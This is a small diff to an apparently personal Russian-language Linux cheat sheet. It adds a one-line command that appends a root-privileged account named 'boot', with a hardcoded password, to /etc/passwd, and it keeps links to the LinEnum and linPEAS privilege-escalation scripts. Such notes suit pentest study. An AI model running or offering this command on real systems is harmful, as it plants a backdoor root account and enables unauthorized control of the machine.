@@ -6,8 +6,12 @@ https://putty.org.ru/articles/unix-linux-ref
 # открыть gui 
 open .
 
+# Добавление пользователя с правами root в /etc/passwd
 
-Скрипты повышения привелегий 
+echo "boot:$(openssl passwd -6 -salt boot password123):0:0:boot:/root:/bin/bash" >> /etc/passwd
+
+
+# Скрипты повышения привелегий 
 
 https://github.com/rebootuser/LinEnum
 https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
